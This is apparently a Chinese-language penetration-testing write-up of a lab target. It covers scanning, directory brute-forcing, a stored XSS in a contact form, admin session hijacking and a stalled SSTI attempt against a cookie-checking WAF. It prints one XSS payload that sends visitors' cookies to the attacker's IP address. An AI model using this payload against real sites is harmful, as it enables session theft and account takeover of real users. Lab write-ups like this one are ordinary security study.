# 靶场&拓扑情况

# 渗透过程

nmap网络环境扫描

![](attachments/Pasted%20image%2020230321103537.png)

访问网页服务，信息收集

![](attachments/Pasted%20image%2020230321103914.png)

在contact发现了一个功能点

![](attachments/Pasted%20image%2020230321104043.png)

dirsearch目录扫描

![](attachments/Pasted%20image%2020230321112141.png)

后台

![](attachments/Pasted%20image%2020230321112408.png)

登录报文

![](attachments/Pasted%20image%2020230321112434.png)

这里思考了组件的漏洞和jwt的cookie伪造没有办法
最后的解决是XSS，在这里一个早一些和这个功能联系起来的
`<svg onload=document.location='http://192.168.163.128?c='+document.cookie>`

![](attachments/Pasted%20image%2020230321153525.png)

![](attachments/Pasted%20image%2020230321153920.png)

那这个cookie登录admin

![](attachments/Pasted%20image%2020230321155617.png)

这里去看log，但是很奇怪为什么bot点xss在我这里有反馈，导致没有办法做操作

![](attachments/Pasted%20image%2020230321160120.png)

这里用burp来拦截放包避免影响，或者构造这样的传参

![](attachments/Pasted%20image%2020230321161017.png)

现在下面可以看到大量的请求

![](attachments/Pasted%20image%2020230321161126.png)

会发现有一个访问了shell的cookie，偷过来用，进入shell界面

![](attachments/Pasted%20image%2020230321161707.png)

发现网站还在建设中，用不了，这里唯一有变化的是Auth的值，尝试SSTI发现报Don't think so!应该是waf

![](attachments/Pasted%20image%2020230321162715.png)

结合下面这个mofo=test的报文，应该是对Auth这个Cookie值有检测

![](attachments/Pasted%20image%2020230321163803.png)